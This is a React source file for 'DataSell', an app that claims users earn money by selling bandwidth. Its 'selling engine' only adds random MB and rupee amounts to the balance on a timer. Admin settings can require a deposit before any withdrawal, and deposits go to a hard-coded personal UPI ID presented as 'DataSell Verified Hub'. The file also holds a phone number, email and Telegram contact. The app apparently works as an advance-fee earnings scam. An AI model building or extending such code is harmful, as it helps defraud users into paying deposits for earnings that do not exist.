/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { 
  AppView, 
  DataPacket, 
  UserState, 
  WithdrawalRecord, 
  TopEarner, 
  UserAccount, 
  AuthLog, 
  DepositRecord,
  SupportConfig,
  DepositGatewayConfig,
  SupportTicket
} from './types';
import { Header } from './components/Header';
import { NavigationDrawer } from './components/NavigationDrawer';
import { DashboardView } from './components/DashboardView';
import { WithdrawView } from './components/WithdrawView';
import { DepositView } from './components/DepositView';
import { WithdrawalHistoryView } from './components/WithdrawalHistoryView';
import { ProfileView } from './components/ProfileView';
import { SupportView } from './components/SupportView';
import { TermsView } from './components/TermsView';
import { LeaderboardView } from './components/LeaderboardView';
import { AdminPanel } from './components/AdminPanel';
import { AuthModal } from './components/AuthModal';
import { 
  INITIAL_TOP_EARNERS, 
  INITIAL_USERS, 
  INITIAL_AUTH_LOGS, 
  INITIAL_DEPOSITS, 
  INITIAL_WITHDRAWALS 
} from './initialData';
import { formatTimeAmPm, formatDateTime, generateOrderNumber, calculateTier } from './utils';

const DEFAULT_SUPPORT_CONFIG: SupportConfig = {
  whatsappNumber: '+91 9823537634',
  email: 'techreal8806@gmail.com',
  telegramLink: 'https://t.me/datasell_official',
  telegramHandle: '@datasell_official',
  notice: 'Our priority support desk is available 24/7 for deposit, withdrawal, and bandwidth assistance.',
};

const DEFAULT_DEPOSIT_GATEWAY: DepositGatewayConfig = {
  upiId: 'techreal8806@oksbi',
  payeeName: 'DataSell Verified Hub',
  minDeposit: 100,
  allowDirectDeposit: true,
  instructions: 'Scan the QR code using any UPI app (PhonePe, GPay, Paytm). Complete the transfer and submit your 12-digit UTR reference number for instant verification.',
};

const DEFAULT_USER_STATE: UserState = {
  email: 'techreal8806@gmail.com',
  name: 'Tech Real',
  phone: '+91 9823537634',
  balance: 0.00, // Starts at 0 as requested by user ("0 se start ho sir")
  totalSoldMB: 0.00,
  isSelling: false,
  tier: 'BRONZE',
  savedUpiId: 'techreal8806@oksbi',
  selectedPaymentMethod: 'PhonePe',
};

export default function App() {
  const [currentView, setCurrentView] = useState<AppView>('dashboard');
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isAuthModalOpen, setIsAuthModalOpen] = useState(false);
  const [isFirstTimeUser, setIsFirstTimeUser] = useState(false);

  // 1. Registered Users database
  const [users, setUsers] = useState<UserAccount[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_users_list');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return INITIAL_USERS;
  });

  // 2. Active User State
  const [userState, setUserState] = useState<UserState>(() => {
    try {
      const saved = localStorage.getItem('datasell_user_state');
      if (saved) {
        const parsed = JSON.parse(saved);
        return { ...DEFAULT_USER_STATE, ...parsed };
      }
    } catch (e) {
      console.error(e);
    }
    return DEFAULT_USER_STATE;
  });

  // 3. Top 1-10 High Earners
  const [topEarners, setTopEarners] = useState<TopEarner[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_top_earners');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return INITIAL_TOP_EARNERS;
  });

  // 4. Auth Logs (Signup & Login Audit Trail)
  const [authLogs, setAuthLogs] = useState<AuthLog[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_auth_logs');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return INITIAL_AUTH_LOGS;
  });

  // 5. Deposits
  const [deposits, setDeposits] = useState<DepositRecord[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_deposits');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return INITIAL_DEPOSITS;
  });

  // 6. Data Packets
  const [packets, setPackets] = useState<DataPacket[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_packets');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return [];
  });

  // 7. Withdrawals
  const [withdrawals, setWithdrawals] = useState<WithdrawalRecord[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_withdrawals');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return INITIAL_WITHDRAWALS;
  });

  // 8. Support & Telegram Config
  const [supportConfig, setSupportConfig] = useState<SupportConfig>(() => {
    try {
      const saved = localStorage.getItem('datasell_support_config');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return DEFAULT_SUPPORT_CONFIG;
  });

  // 9. Deposit Gateway Config (UPI ID & QR Scanner)
  const [depositConfig, setDepositConfig] = useState<DepositGatewayConfig>(() => {
    try {
      const saved = localStorage.getItem('datasell_deposit_config');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return DEFAULT_DEPOSIT_GATEWAY;
  });

  // 10. Support Tickets
  const [supportTickets, setSupportTickets] = useState<SupportTicket[]>(() => {
    try {
      const saved = localStorage.getItem('datasell_support_tickets');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error(e);
    }
    return [];
  });

  // First time mobile/browser visit: trigger sign-up prompt
  useEffect(() => {
    try {
      const visited = localStorage.getItem('datasell_first_visit_done');
      if (!visited) {
        setIsFirstTimeUser(true);
        setIsAuthModalOpen(true);
        localStorage.setItem('datasell_first_visit_done', 'true');
      }
    } catch (e) {
      console.error(e);
    }
  }, []);

  // Persistent storage synchronizations
  useEffect(() => {
    try {
      localStorage.setItem('datasell_users_list', JSON.stringify(users));
    } catch (e) {
      console.error(e);
    }
  }, [users]);

  useEffect(() => {
    try {
      localStorage.setItem('datasell_user_state', JSON.stringify(userState));
    } catch (e) {
      console.error(e);
    }
  }, [userState]);

  useEffect(() => {
    try {
      localStorage.setItem('datasell_top_earners', JSON.stringify(topEarners));
    } catch (e) {
      console.error(e);
    }
  }, [topEarners]);

  useEffect(() => {
    try {
      localStorage.setItem('datasell_auth_logs', JSON.stringify(authLogs));
    } catch (e) {
      console.error(e);
    }
  }, [authLogs]);

  useEffect(() => {
    try {
      localStorage.setItem('datasell_deposits', JSON.stringify(deposits));
    } catch (e) {
      console.error(e);
    }
  }, [deposits]);

  useEffect(() => {
    try {
      localStorage.setItem('datasell_packets', JSON.stringify(packets));
    } catch (e) {
      console.error(e);
    }
  }, [packets]);

  useEffect(() => {
    try {
      localStorage.setItem('datasell_withdrawals', JSON.stringify(withdrawals));
    } catch (e) {
      console.error(e);
    }
  }, [withdrawals]);

  useEffect(() => {
    try {
      localStorage.setItem('datasell_support_config', JSON.stringify(supportConfig));
    } catch (e) {
      console.error(e);
    }
  }, [supportConfig]);

  useEffect(() => {
    try {
      localStorage.setItem('datasell_deposit_config', JSON.stringify(depositConfig));
    } catch (e) {
      console.error(e);
    }
  }, [depositConfig]);

  useEffect(() => {
    try {
      localStorage.setItem('datasell_support_tickets', JSON.stringify(supportTickets));
    } catch (e) {
      console.error(e);
    }
  }, [supportTickets]);

  // Sync active user balance back to users table if modified
  useEffect(() => {
    setUsers((prev) =>
      prev.map((u) => {
        if (u.email.toLowerCase() === userState.email.toLowerCase()) {
          return {
            ...u,
            balance: userState.balance,
            totalSoldMB: userState.totalSoldMB,
            tier: userState.tier,
            savedUpiId: userState.savedUpiId,
          };
        }
        return u;
      })
    );
  }, [userState.balance, userState.totalSoldMB, userState.tier, userState.savedUpiId, userState.email]);

  // Live Bandwidth Selling Engine
  useEffect(() => {
    let interval: NodeJS.Timeout | null = null;

    if (userState.isSelling) {
      interval = setInterval(() => {
        // Random packet size between 5.10MB and 6.45MB matching video logs
        const mbIncrement = parseFloat((Math.random() * (6.45 - 5.10) + 5.10).toFixed(2));
        const amountIncrement = parseFloat((mbIncrement * 1.0).toFixed(2));

        const newPacket: DataPacket = {
          id: 'pkt_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
          time: formatTimeAmPm(new Date()),
          mb: mbIncrement,
          amount: amountIncrement,
        };

        setUserState((prev) => {
          const newTotalSold = prev.totalSoldMB + mbIncrement;
          const newBalance = prev.balance + amountIncrement;
          return {
            ...prev,
            totalSoldMB: parseFloat(newTotalSold.toFixed(2)),
            balance: parseFloat(newBalance.toFixed(2)),
            tier: calculateTier(newTotalSold),
          };
        });

        setPackets((prev) => [newPacket, ...prev.slice(0, 49)]);
      }, 1800);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [userState.isSelling]);

  // Toggle selling status
  const handleToggleSelling = () => {
    setUserState((prev) => ({
      ...prev,
      isSelling: !prev.isSelling,
    }));
  };

  // Instant batch sell (e.g. +50MB or +500MB)
  const handleInstantSellBatch = (mb: number, amount: number) => {
    const newPacket: DataPacket = {
      id: 'pkt_' + Date.now(),
      time: formatTimeAmPm(new Date()),
      mb: mb,
      amount: amount,
    };

    setUserState((prev) => {
      const newTotalSold = prev.totalSoldMB + mb;
      const newBalance = prev.balance + amount;
      return {
        ...prev,
        totalSoldMB: parseFloat(newTotalSold.toFixed(2)),
        balance: parseFloat(newBalance.toFixed(2)),
        tier: calculateTier(newTotalSold),
      };
    });

    setPackets((prev) => [newPacket, ...prev.slice(0, 49)]);
  };

  // Submit withdrawal request
  const handleSubmitWithdrawal = (
    amount: number,
    upiId: string,
    method: 'PhonePe' | 'GPay' | 'UPI'
  ): boolean => {
    if (amount > userState.balance) return false;

    const orderNumber = generateOrderNumber();
    const newRecord: WithdrawalRecord = {
      id: 'wd_' + Date.now(),
      userId: userState.id || 'usr_main',
      userEmail: userState.email,
      orderNumber: orderNumber,
      amount: amount,
      type: method,
      upiId: upiId,
      time: formatDateTime(new Date()),
      status: 'PENDING',
    };

    // Deduct balance
    setUserState((prev) => ({
      ...prev,
      balance: parseFloat((prev.balance - amount).toFixed(2)),
      savedUpiId: upiId,
      selectedPaymentMethod: method,
    }));

    // Add to withdrawal records
    setWithdrawals((prev) => [newRecord, ...prev]);

    return true;
  };

  // Manually approve a pending withdrawal
  const handleApproveRecord = (id: string) => {
    setWithdrawals((prev) =>
      prev.map((rec) => (rec.id === id ? { ...rec, status: 'SUCCESSFUL' } : rec))
    );
  };

  // Update profile
  const handleUpdateProfile = (updated: Partial<UserState>) => {
    setUserState((prev) => ({ ...prev, ...updated }));
  };

  // Auth Modal Callback: Handle new login or registration
  const handleAuthSuccess = (account: UserAccount, authLog: AuthLog) => {
    // 1. Add log to authLogs
    setAuthLogs((prev) => [authLog, ...prev]);

    // 2. If new user, add to users list
    setUsers((prev) => {
      const exists = prev.some((u) => u.id === account.id || u.email.toLowerCase() === account.email.toLowerCase());
      if (exists) {
        return prev.map((u) => (u.id === account.id ? account : u));
      }
      return [account, ...prev];
    });

    // 3. Set current active user state
    setUserState({
      id: account.id,
      email: account.email,
      name: account.name,
      phone: account.phone,
      balance: account.balance,
      totalSoldMB: account.totalSoldMB,
      isSelling: false,
      tier: account.tier,
      savedUpiId: account.savedUpiId,
      selectedPaymentMethod: account.selectedPaymentMethod,
      status: account.status,
      requireDepositBeforeWithdrawal: account.requireDepositBeforeWithdrawal,
      requiredDepositAmount: account.requiredDepositAmount,
      hasCompletedRequiredDeposit: account.hasCompletedRequiredDeposit,
      withdrawalDepositNotice: account.withdrawalDepositNotice,
    });
  };

  // Add new deposit (from user deposit form or admin credit)
  const handleAddDeposit = (newDep: DepositRecord) => {
    setDeposits((prev) => [newDep, ...prev]);
    if (newDep.status === 'COMPLETED') {
      setUserState((prev) => {
        if (prev.email.toLowerCase() === newDep.userEmail.toLowerCase()) {
          return {
            ...prev,
            balance: parseFloat((prev.balance + newDep.amount).toFixed(2)),
            hasCompletedRequiredDeposit: true,
          };
        }
        return prev;
      });
      setUsers((prev) =>
        prev.map((u) => {
          if (u.email.toLowerCase() === newDep.userEmail.toLowerCase()) {
            return {
              ...u,
              balance: parseFloat((u.balance + newDep.amount).toFixed(2)),
              hasCompletedRequiredDeposit: true,
            };
          }
          return u;
        })
      );
    }
  };

  // Reset to 0 as requested ("0 se start ho sir")
  const handleResetToZero = () => {
    if (window.confirm('Reset all balance, MB sold, and history back to 0?')) {
      const resetState: UserState = {
        ...DEFAULT_USER_STATE,
        balance: 0.00,
        totalSoldMB: 0.00,
        isSelling: false,
      };
      setUserState(resetState);
      setPackets([]);
      localStorage.removeItem('datasell_user_state');
      localStorage.removeItem('datasell_packets');
    }
  };

  // If viewing Admin Panel, render dedicated full-width view
  if (currentView === 'admin') {
    return (
      <AdminPanel
        onBackToUserView={() => setCurrentView('dashboard')}
        users={users}
        onUpdateUsers={setUsers}
        withdrawals={withdrawals}
        onUpdateWithdrawals={setWithdrawals}
        topEarners={topEarners}
        onUpdateTopEarners={setTopEarners}
        authLogs={authLogs}
        onClearLogs={() => setAuthLogs([])}
        deposits={deposits}
        onAddDeposit={handleAddDeposit}
        onUpdateDeposits={setDeposits}
        supportConfig={supportConfig}
        onUpdateSupportConfig={setSupportConfig}
        supportTickets={supportTickets}
        onUpdateTickets={setSupportTickets}
        depositConfig={depositConfig}
        onUpdateDepositConfig={setDepositConfig}
      />
    );
  }

  return (
    <div className="min-h-screen bg-slate-100 flex flex-col items-center justify-start antialiased text-slate-800">
      {/* Container simulating the mobile app frame */}
      <div className="w-full max-w-md min-h-screen bg-slate-50 border-x border-slate-200 shadow-2xl flex flex-col relative pb-8">
        {/* Top Header */}
        <Header
          onOpenMenu={() => setIsMenuOpen(true)}
          isSelling={userState.isSelling}
          onReset={handleResetToZero}
          onOpenLeaderboard={() => setCurrentView('leaderboard')}
          onOpenAuth={() => setIsAuthModalOpen(true)}
          userEmail={userState.email}
        />

        {/* Side Navigation Drawer */}
        <NavigationDrawer
          isOpen={isMenuOpen}
          onClose={() => setIsMenuOpen(false)}
          currentView={currentView}
          onSelectView={(view) => setCurrentView(view)}
          userEmail={userState.email}
          onLogout={handleResetToZero}
          onOpenAuth={() => setIsAuthModalOpen(true)}
          telegramLink={supportConfig.telegramLink}
          onOpenAdmin={() => setCurrentView('admin')}
        />

        {/* Main Content Area based on current view */}
        <main className="flex-1">
          {currentView === 'dashboard' && (
            <DashboardView
              userState={userState}
              onToggleSelling={handleToggleSelling}
              packets={packets}
              onOpenWithdraw={() => setCurrentView('withdraw')}
              onOpenDeposit={() => setCurrentView('deposit')}
              onInstantSellBatch={handleInstantSellBatch}
              topEarners={topEarners}
              onOpenLeaderboard={() => setCurrentView('leaderboard')}
            />
          )}

          {currentView === 'leaderboard' && (
            <LeaderboardView
              topEarners={topEarners}
              onBack={() => setCurrentView('dashboard')}
              currentUserEmail={userState.email}
            />
          )}

          {currentView === 'withdraw' && (
            <WithdrawView
              userState={userState}
              onBack={() => setCurrentView('dashboard')}
              onSubmitWithdrawal={handleSubmitWithdrawal}
              onGoToHistory={() => setCurrentView('history')}
              onOpenDeposit={() => setCurrentView('deposit')}
            />
          )}

          {currentView === 'deposit' && (
            <DepositView
              userState={userState}
              depositConfig={depositConfig}
              onBack={() => setCurrentView('dashboard')}
              onSubmitDeposit={handleAddDeposit}
              onGoToWithdraw={() => setCurrentView('withdraw')}
            />
          )}

          {currentView === 'history' && (
            <WithdrawalHistoryView
              records={withdrawals}
              onBack={() => setCurrentView('dashboard')}
              onApproveRecord={handleApproveRecord}
            />
          )}

          {currentView === 'profile' && (
            <ProfileView
              userState={userState}
              onBack={() => setCurrentView('dashboard')}
              onUpdateProfile={handleUpdateProfile}
              onOpenAdmin={() => setCurrentView('admin')}
            />
          )}

          {currentView === 'support' && (
            <SupportView 
              onBack={() => setCurrentView('dashboard')} 
              supportConfig={supportConfig}
              userEmail={userState.email}
              onAddTicket={(ticket) => setSupportTickets((prev) => [ticket, ...prev])}
            />
          )}

          {currentView === 'terms' && (
            <TermsView onBack={() => setCurrentView('dashboard')} />
          )}
        </main>
      </div>

      {/* Auth Modal for Login & Signup with real-time audit logs and Admin Master Gateway */}
      <AuthModal
        isOpen={isAuthModalOpen}
        onClose={() => setIsAuthModalOpen(false)}
        onAuthSuccess={handleAuthSuccess}
        onAdminAuthSuccess={() => {
          setIsAuthModalOpen(false);
          setCurrentView('admin');
        }}
        existingUsers={users}
        initialMode={isFirstTimeUser ? 'SIGNUP' : 'LOGIN'}
        isFirstTime={isFirstTimeUser}
      />
    </div>
  );
}
